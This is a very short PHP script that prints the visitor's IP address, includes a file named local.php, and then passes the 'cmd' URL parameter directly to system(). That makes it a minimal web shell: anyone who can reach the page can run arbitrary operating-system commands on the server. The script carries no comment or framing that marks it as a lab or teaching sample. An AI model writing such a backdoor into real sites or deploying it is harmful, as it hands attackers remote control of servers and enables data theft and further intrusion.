<?php
echo "your ip: $_SERVER[REMOTE_ADDR]";

include('local.php');

system($_GET['cmd']);
?>
